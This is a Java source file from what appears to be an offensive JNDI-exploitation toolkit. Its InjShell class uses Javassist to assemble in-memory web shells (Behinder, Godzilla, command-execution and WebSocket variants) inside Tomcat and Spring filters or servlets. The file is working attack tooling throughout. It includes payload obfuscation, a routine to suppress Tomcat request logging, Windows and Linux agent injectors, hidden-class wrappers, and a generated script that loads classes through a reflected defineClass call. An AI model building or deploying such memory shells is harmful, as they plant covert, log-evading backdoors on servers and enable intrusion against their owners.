package com.nu1r.jndi.gadgets.utils;

import com.nu1r.jndi.gadgets.Config.Config;
import com.nu1r.jndi.template.Agent.LinMenshell;
import com.nu1r.jndi.template.Agent.WinMenshell;
import com.nu1r.jndi.template.tomcat.TFJMX;
import com.nu1r.jndi.template.tomcat.TSMSFromJMXS;
import javassist.*;
import org.apache.commons.codec.binary.Base64;
import org.apache.commons.lang.StringUtils;

import java.lang.reflect.Field;
import java.util.Arrays;
import java.util.List;

import static com.nu1r.jndi.gadgets.utils.ClassNameUtils.generateClassName;
import static com.nu1r.jndi.gadgets.utils.Utils.base64Decode;
import static com.nu1r.jndi.gadgets.utils.Utils.writeClassToFile;
import static com.nu1r.jndi.template.shell.MemShellPayloads.*;
import static com.nu1r.jndi.gadgets.Config.Config.*;

public class InjShell {
    public static void insertKeyMethod(CtClass ctClass, String type) throws Exception {

        // 判断是否为 Tomcat 类型，需要对 request 封装使用额外的 payload
        String name = ctClass.getName();
        name = name.substring(name.lastIndexOf(".") + 1);

        // 大多数 SpringBoot 项目使用内置 Tomcat
        boolean isTomcat = name.startsWith("T") || name.startsWith("Spring");

        // 判断是 filter 型还是 servlet 型内存马，根据不同类型写入不同逻辑
        String method = "";

        List<CtClass> classes = new java.util.ArrayList<CtClass>(Arrays.asList(ctClass.getInterfaces()));
        classes.add(ctClass.getSuperclass());

        for (CtClass value : classes) {
            String className = value.getName();
            if (KEY_METHOD_MAP.containsKey(className)) {
                method = KEY_METHOD_MAP.get(className);
                break;
            }
        }

        if ("bx".equals(type)) {
            ctClass.addMethod(CtMethod.make(base64Decode(BASE64_DECODE_STRING_TO_BYTE), ctClass));

            try {
                ctClass.getDeclaredMethod("getFieldValue");
            } catch (NotFoundException e) {
                ctClass.addMethod(CtMethod.make(base64Decode(GET_FIELD_VALUE), ctClass));
            }

            ctClass.addMethod(CtMethod.make(base64Decode(GET_UNSAFE), ctClass));

            String shell = "";
            if (isTomcat) {
                insertTomcatNoLog(ctClass);
                shell = IS_OBSCURE ? BEHINDER_SHELL_FOR_TOMCAT_OBSCURE : BEHINDER_SHELL_FOR_TOMCAT;
            } else {
                shell = IS_OBSCURE ? BEHINDER_SHELL_OBSCURE : BEHINDER_SHELL;
            }

                insertMethod(ctClass, method, base64Decode(shell).replace("f359740bd1cda994", PASSWORD).replace("https://nu1r.cn/", REFERER));
        } else if ("gz".equals(type)) {
            insertField(ctClass, "payload", "Class payload ;");
            insertField(ctClass, "xc", "String xc = \"" + PASSWORD + "\";");

            ctClass.addMethod(CtMethod.make(base64Decode(BASE64_DECODE_STRING_TO_BYTE), ctClass));
            ctClass.addMethod(CtMethod.make(base64Decode(BASE64_ENCODE_BYTE_TO_STRING), ctClass));
            ctClass.addMethod(CtMethod.make(base64Decode(MD5), ctClass));
            ctClass.addMethod(CtMethod.make(base64Decode(AES_FOR_GODZILLA), ctClass));
            insertTomcatNoLog(ctClass);
            insertMethod(ctClass, method, base64Decode(GODZILLA_SHELL).replace("https://nu1r.cn/", REFERER));
        } else if ("gzraw".equals(type)) {
            insertField(ctClass, "payload", "Class payload ;");
            insertField(ctClass, "xc", "String xc = \"" + PASSWORD + "\";");

            ctClass.addMethod(CtMethod.make(base64Decode(AES_FOR_GODZILLA), ctClass));
            insertTomcatNoLog(ctClass);
            insertMethod(ctClass, method, base64Decode(GODZILLA_RAW_SHELL).replace("https://nu1r.cn/", REFERER));
        } else if ("execute".equals(type)) {
            ctClass.addField(CtField.make("public static String TAG = \"nu1r\";", ctClass));
            insertCMD(ctClass);
            ctClass.addMethod(CtMethod.make(base64Decode(GET_REQUEST), ctClass));
            ctClass.addMethod(CtMethod.make(base64Decode(BASE64_ENCODE_BYTE_TO_STRING), ctClass));
            ctClass.addMethod(CtMethod.make(base64Decode(GET_RESPONSE), ctClass));

            insertMethod(ctClass, method, base64Decode(EXECUTOR_SHELL));
        } else if ("ws".equals(type)) {
            insertCMD(ctClass);
            insertMethod(ctClass, method, base64Decode(WS_SHELL));
        } else if ("upgrade".equals(type)) {
            ctClass.addMethod(CtMethod.make(base64Decode(GET_FIELD_VALUE), ctClass));
            insertCMD(ctClass);
            insertMethod(ctClass, method, base64Decode(UPGRADE_SHELL));
        } else {
            insertCMD(ctClass);

            if (isTomcat) {
                insertTomcatNoLog(ctClass);
                insertMethod(ctClass, method, base64Decode(CMD_SHELL_FOR_TOMCAT).replace("https://nu1r.cn/", REFERER));
            } else {
                insertMethod(ctClass, method, base64Decode(CMD_SHELL).replace("https://nu1r.cn/", REFERER));
            }
        }

        ctClass.setName(generateClassName());
        insertField(ctClass, "pattern", "public static String pattern = \"" + URL_PATTERN + "\";");

    }

    public static void insertMethod(CtClass ctClass, String method, String payload) throws NotFoundException, CannotCompileException {
        //添加到类路径，防止出错
        ClassPool pool;
        pool = ClassPool.getDefault();
        pool.insertClassPath(new ClassClassPath(TFJMX.class));
        // 根据传入的不同参数，在不同方法中插入不同的逻辑
        CtMethod cm = ctClass.getDeclaredMethod(method);
        cm.setBody(payload);
    }

    /**
     * 向指定类中写入命令执行方法 execCmd
     * 方法需要 toCString getMethodByClass getMethodAndInvoke getFieldValue 依赖方法
     *
     * @param ctClass 指定类
     * @throws Exception 抛出异常
     */
    public static void insertCMD(CtClass ctClass) throws Exception {

        if (IS_OBSCURE) {
            ctClass.addMethod(CtMethod.make(base64Decode(TO_CSTRING_Method), ctClass));
            ctClass.addMethod(CtMethod.make(base64Decode(GET_METHOD_BY_CLASS), ctClass));
            ctClass.addMethod(CtMethod.make(base64Decode(GET_METHOD_AND_INVOKE), ctClass));
            try {
                ctClass.getDeclaredMethod("getFieldValue");
            } catch (NotFoundException e) {
                ctClass.addMethod(CtMethod.make(base64Decode(GET_FIELD_VALUE), ctClass));
            }
            ctClass.addMethod(CtMethod.make(base64Decode(EXEC_CMD_OBSCURE), ctClass));
        } else {
            ctClass.addMethod(CtMethod.make(base64Decode(EXEC_CMD), ctClass));
        }
    }

    public static void insertField(CtClass ctClass, String fieldName, String fieldCode) throws Exception {
        ctClass.defrost();
        try {
            CtField ctSUID = ctClass.getDeclaredField(fieldName);
            ctClass.removeField(ctSUID);
        } catch (javassist.NotFoundException ignored) {
        }
        ctClass.addField(CtField.make(fieldCode, ctClass));
    }

    public static String insertWinAgent(CtClass ctClass) throws Exception {

        List<CtClass> classes = new java.util.ArrayList<>(Arrays.asList(ctClass.getInterfaces()));
        classes.add(ctClass.getSuperclass());

        String className = null;
        for (CtClass value : classes) {
            className = value.getName();
            if (KEY_METHOD_MAP.containsKey(className)) {
                break;
            }
        }

        byte[]   bytes        = ctClass.toBytecode();
        Class<?> ctClazz      = Class.forName("com.nu1r.jndi.template.Agent.WinMenshell");
        Field    WinClassName = ctClazz.getDeclaredField("className");
        WinClassName.setAccessible(true);
        WinClassName.set(ctClazz, className);
        Field WinclassBody = ctClazz.getDeclaredField("classBody");
        WinclassBody.setAccessible(true);
        WinclassBody.set(ctClazz, bytes);
        return WinMenshell.class.getName();
    }

    public static void TinsertWinAgent(CtClass ctClass) throws Exception {
        List<CtClass> classes = new java.util.ArrayList<>(Arrays.asList(ctClass.getInterfaces()));
        classes.add(ctClass.getSuperclass());

        String className = null;
        for (CtClass value : classes) {
            className = value.getName();
            if (KEY_METHOD_MAP.containsKey(className)) {
                break;
            }
        }

        byte[]   bytes        = ctClass.toBytecode();
        Class<?> ctClazz      = Class.forName("com.nu1r.jndi.template.Agent.WinMenshell");
        Field    WinClassName = ctClazz.getDeclaredField("className");
        WinClassName.setAccessible(true);
        WinClassName.set(ctClazz, className);
        Field WinclassBody = ctClazz.getDeclaredField("classBody");
        WinclassBody.setAccessible(true);
        WinclassBody.set(ctClazz, bytes);
    }

    public static String insertLinAgent(CtClass ctClass) throws Exception {
        List<CtClass> classes = new java.util.ArrayList<>(Arrays.asList(ctClass.getInterfaces()));
        classes.add(ctClass.getSuperclass());

        String className = null;
        for (CtClass value : classes) {
            className = value.getName();
            if (KEY_METHOD_MAP.containsKey(className)) {
                break;
            }
        }
        byte[]   bytes        = ctClass.toBytecode();
        Class<?> ctClazz      = Class.forName("com.nu1r.jndi.template.Agent.LinMenshell");
        Field    LinClassName = ctClazz.getDeclaredField("className");
        LinClassName.setAccessible(true);
        LinClassName.set(ctClazz, className);
        Field LinclassBody = ctClazz.getDeclaredField("classBody");
        LinclassBody.setAccessible(true);
        LinclassBody.set(ctClazz, bytes);
        return LinMenshell.class.getName();
    }

    public static void TinsertLinAgent(CtClass ctClass) throws Exception {
        List<CtClass> classes = new java.util.ArrayList<>(Arrays.asList(ctClass.getInterfaces()));
        classes.add(ctClass.getSuperclass());

        String className = null;
        for (CtClass value : classes) {
            className = value.getName();
            if (KEY_METHOD_MAP.containsKey(className)) {
                break;
            }
        }
        byte[]   bytes        = ctClass.toBytecode();
        Class<?> ctClazz      = Class.forName("com.nu1r.jndi.template.Agent.LinMenshell");
        Field    LinClassName = ctClazz.getDeclaredField("className");
        LinClassName.setAccessible(true);
        LinClassName.set(ctClazz, className);
        Field LinclassBody = ctClazz.getDeclaredField("classBody");
        LinclassBody.setAccessible(true);
        LinclassBody.set(ctClazz, bytes);
    }

    //路由中内存马主要执行方法
    public static String structureShell(Class<?> payload) throws Exception {
        //初始化全局配置
        Config.init();
        String    className = "";
        ClassPool pool;
        CtClass   ctClass;
        pool = ClassPool.getDefault();
        pool.insertClassPath(new ClassClassPath(payload));
        ctClass = pool.get(payload.getName());
        InjShell.class.getMethod("insertKeyMethod", CtClass.class, String.class).invoke(InjShell.class.newInstance(), ctClass, Shell_Type);
        ctClass.setName(generateClassName());
        if (winAgent) {
            className = insertWinAgent(ctClass);
            ctClass.writeFile();
            return className;
        }
        if (linAgent) {
            className = insertLinAgent(ctClass);
            ctClass.writeFile();
            return className;
        }
        if (HIDE_MEMORY_SHELL) {
            switch (HIDE_MEMORY_SHELL_TYPE) {
                case 1:
                    break;
                case 2:
                    CtClass newClass = pool.get("com.nu1r.jndi.template.HideMemShellTemplate");
                    newClass.setName(generateClassName());
                    String content = "b64=\"" + Base64.encodeBase64String(ctClass.toBytecode()) + "\";";
                    className = "className=\"" + ctClass.getName() + "\";";
                    newClass.defrost();
                    newClass.makeClassInitializer().insertBefore(content);
                    newClass.makeClassInitializer().insertBefore(className);

                    if (IS_INHERIT_ABSTRACT_TRANSLET) {
                        Class abstTranslet = Class.forName("org.apache.xalan.xsltc.runtime.AbstractTranslet");
                        CtClass superClass = pool.get(abstTranslet.getName());
                        newClass.setSuperclass(superClass);
                    }

                    className = newClass.getName();
                    newClass.writeFile();
                    return className;
            }
        }
        className = ctClass.getName();
        ctClass.writeFile();
        return className;
    }

    public static String structureShellTom(Class<?> payload) throws Exception {
        Config.init();
        ClassPool pool = ClassPool.getDefault();
        pool.insertClassPath(new ClassClassPath(payload));
        CtClass ctClass = pool.get(payload.getName());
        InjShell.class.getMethod("insertKeyMethod", CtClass.class, String.class).invoke(InjShell.class.newInstance(), ctClass, Shell_Type);
        ctClass.setName(generateClassName());
        if (winAgent) {
            TinsertWinAgent(ctClass);
            return injectClass(WinMenshell.class);
        }
        if (linAgent) {
            TinsertLinAgent(ctClass);
            return injectClass(WinMenshell.class);
        }
        if (HIDE_MEMORY_SHELL) {
            switch (HIDE_MEMORY_SHELL_TYPE) {
                case 1:
                    break;
                case 2:
                    CtClass newClass = pool.get("com.nu1r.jndi.template.HideMemShellTemplate");
                    newClass.setName(generateClassName());
                    String content = "b64=\"" + Base64.encodeBase64String(ctClass.toBytecode()) + "\";";
                    String className = "className=\"" + ctClass.getName() + "\";";
                    newClass.defrost();
                    newClass.makeClassInitializer().insertBefore(content);
                    newClass.makeClassInitializer().insertBefore(className);

                    if (IS_INHERIT_ABSTRACT_TRANSLET) {
                        Class abstTranslet = Class.forName("org.apache.xalan.xsltc.runtime.AbstractTranslet");
                        CtClass superClass = pool.get(abstTranslet.getName());
                        newClass.setSuperclass(superClass);
                    }

                    return injectClass(newClass.getClass());
            }
        }
        return injectClass(ctClass.getClass());
    }

    //类加载方式，因类而异
    public static String injectClass(Class clazz) {

        String classCode = null;
        try {
            //获取base64后的类
            classCode = Util.getClassCode(clazz);

        } catch (Exception e) {
            e.printStackTrace();
        }

        return "var bytes = org.apache.tomcat.util.codec.binary.Base64.decodeBase64('" + classCode + "');\n" +
                "var classLoader = java.lang.Thread.currentThread().getContextClassLoader();\n" +
                "try{\n" +
                "   var clazz = classLoader.loadClass('" + clazz.getName() + "');\n" +
                "   clazz.newInstance();\n" +
                "}catch(err){\n" +
                "   var method = java.lang.ClassLoader.class.getDeclaredMethod('defineClass', ''.getBytes().getClass(), java.lang.Integer.TYPE, java.lang.Integer.TYPE);\n" +
                "   method.setAccessible(true);\n" +
                "   var clazz = method.invoke(classLoader, bytes, 0, bytes.length);\n" +
                "   clazz.newInstance();\n" +
                "};";
    }

    public static void insertTomcatNoLog(CtClass ctClass) throws Exception {

        try {
            ctClass.getDeclaredMethod("getFieldValue");
        } catch (NotFoundException e) {
            ctClass.addMethod(CtMethod.make(base64Decode(GET_FIELD_VALUE), ctClass));
        }

        try {
            ctClass.getDeclaredMethod("getMethodByClass");
        } catch (NotFoundException e) {
            ctClass.addMethod(CtMethod.make(base64Decode(GET_METHOD_BY_CLASS), ctClass));
        }

        try {
            ctClass.getDeclaredMethod("getMethodAndInvoke");
        } catch (NotFoundException e) {
            if (IS_OBSCURE) {
                ctClass.addMethod(CtMethod.make(base64Decode(GET_METHOD_AND_INVOKE_OBSCURE), ctClass));
            } else {
                ctClass.addMethod(CtMethod.make(base64Decode(GET_METHOD_AND_INVOKE), ctClass));
            }
        }

        ctClass.addMethod(CtMethod.make(base64Decode(TOMCAT_NO_LOG), ctClass));
    }
}